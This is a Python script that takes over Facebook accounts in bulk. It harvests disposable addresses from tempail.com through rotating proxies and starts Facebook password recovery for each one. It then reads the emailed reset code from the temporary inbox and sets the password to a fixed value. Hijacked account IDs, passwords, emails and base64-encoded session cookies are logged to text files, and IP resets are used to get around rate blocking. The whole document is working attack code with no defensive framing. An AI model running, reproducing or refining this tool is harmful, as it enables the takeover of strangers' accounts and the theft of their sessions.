from os import system
from time import time, sleep
from base64 import b64encode
from user_agent import generate_user_agent as ua
import requests, random
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
def tempmail_headers() -> dict:
    return {'authority': 'tempail.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'tr-TR,tr;q=0.9','cache-control': 'max-age=0','referer': 'https://tempail.com/en/','sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua()}
def tempmail_get() -> tuple or None:
    trying = 0
    while True:
        proxy=open("proxy.txt", "r").read().splitlines()
        proxy=random.choice(proxy)
        try:
            response = requests.get('https://tempail.com/en/',headers=tempmail_headers(), proxies={'http':proxy,'https':proxy}, timeout=3)
            res_text = response.text
            email = res_text.split('adres-input" value="')[1].split('"')[0]
            session = res_text.split('var oturum="')[1].split('"')[0]
            phpsid = response.cookies.get("PHPSESSID")
            return email, session, phpsid
        except Exception as e:
            print(f"{E}[-] Get email error => {e}")
        trying += 1
        if trying == 5:
            return None
        sleep(1)
def tempmail_code(session: str, phpsid: str) -> str:
    sleep(5)
    payload = {'oturum': session,'tarih': str(time()*1000)[:10],'geri_don': 'https://tempail.com/en/',}
    trying = 0
    while True:
        try:
            response = requests.post("https://tempail.com/en/api/kontrol/",headers=tempmail_headers(),data=payload,cookies={'PHPSESSID': phpsid},).text
            if 'baslik' in response and 'Waiting for emails' not in response:
                if 'Facebook account recovery code' in response:
                    mail_no = response.split('mail_')[1].split('"')[0]
                    response = requests.post(f"https://tempail.com/en/api/icerik/?oturum={session}&mail_no={mail_no}",headers=tempmail_headers(),cookies={'PHPSESSID': phpsid},).text
                    return response.split('&amp;n=')[1].split('&')[0]
                else:
                    return response.split('<div class="baslik">')[1].split(' ')[0]
        except Exception as e:
            print(f"{E}[-] Get code error => {e}")
        if trying == 15:
            print("{S}[-] Code did not arrive")
            return ""
        trying += 1
        sleep(2)
def facebook_headers() -> dict:
     return {'Host': 'www.facebook.com','Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"','Content-Type': 'application/x-www-form-urlencoded','X-Asbd-Id': '129477','Sec-Ch-Ua-Mobile': '?0','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36','Sec-Ch-Ua-Platform': '"Windows"','Accept': '*/*','Origin': 'https://www.facebook.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty',
'Referer': 'https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0','Accept-Language': 'tr-TR,tr;q=0.9'}
def send_reset_code(session: requests.Session, email: str) -> bool:
    response = session.get("https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0").text
    lsd = response.split('token":"')[1].split('"')[0]
    session.headers.update({'X-Fb-Lsd': lsd})
    payload = {'lsd': lsd,'email': email,'did_submit': '1','__user': '0','__a': '1',}
    response = session.post("https://www.facebook.com/ajax/login/help/identify.php?ctx=recover", data=payload).text
    if 'Engellendin' not in response:
        try:
            ldata = response.split('ldata=')[1].split('"')[0]
            print(f"{G}[√] Registered => {B}{email}")
            response = session.post(f"https://www.facebook.com/ajax/recover/initiate/?recover_method=send_email&lara=1",data={'lsd': lsd,'__user': '0','__a': '1'}).text
            reset_hash = response.split('hash=')[1].split('"')[0]
            session.get(f"https://www.facebook.com/recover/code/?em[0]={email.replace('@', '%40')}&rm=send_email&lara=1&hash={reset_hash}")
            return True
        except Exception as e:
            print(f"{E}[×] No Account Registered => {S}{email}")
    else:
        print(f"[!] IP blocked => {response}")
        return False
def submit_code(session: requests.Session, email: str, code: str):
    lsd = session.headers["X-Fb-Lsd"]
    response = session.post(f"https://www.facebook.com/recover/code/?em%5B0%5D={email}&rm=send_email&spc=0&fl=default_recover&wsr=0",data={'lsd': lsd,'n': code,'reset_action': '1',},allow_redirects=True)
    user_id = response.url.split('u=')[1].split('&')[0]
    print(f"{G}[√] Code Approved")
    response = session.post(f"https://www.facebook.com/recover/password/write/?u={user_id}&n={code}&fl=default_recover&rm=send_email",data={'lsd': lsd,'encpass': '#PWD_BROWSER:0:0:' + password,},allow_redirects=True)
    cookies = b64encode(str(session.cookies.get_dict()).encode('utf-8')).decode('utf-8')
    if 'checkpoint' in response.url:
        print(f"{S}[×] Account checkpoint => {B}{user_id}:{password}")
        open("checkpoint.txt", "a+").write(f"{user_id}:{password}:{email}:{cookies}\n")
    else:
        try:
            response = session.get("https://www.facebook.com/your_information/?tab=your_information&tile=personal_info_grouping").text
            creation_date = response.split('reated your account",')[1].split(',')[0].split(':')[1].replace('"', '').strip()
        except:
            creation_date = "null"    
        print(f"{G}[√] Active account => {B}{user_id}:{email}:{password}:{creation_date}")
        open("success.txt", "a+").write(f"{user_id}:{password}:{email}:{creation_date}:{cookies}\n")
def start() -> None:
    count = 0
    while True:
        try:
            if mobil_reset:
                if count >= 2:
                    count = 0
                    print(f"[+] IP address changed => {requests.get(reset_url).text}")
                    sleep(8)
                else:
                    count += 1
            email_data = tempmail_get()
            if email_data is not None:
                email = email_data[0]
                session = requests.Session()
                session.headers.update(facebook_headers())
                if send_reset_code(session, email):
                    print("[+] Mail is waiting")
                    code = tempmail_code(email_data[1], email_data[2])
                    if code != "":
                        print(f"[+] Code received => {email}|{code}")
                        submit_code(session, email, code)
                    else:
                        print(f"[-] Could not receive code => {email}")
        except Exception as e:
            print(f"[!] Something went wrong => {e}")
if __name__ == '__main__':
    password = "SizaGod"
    mobil_reset = False
    start()
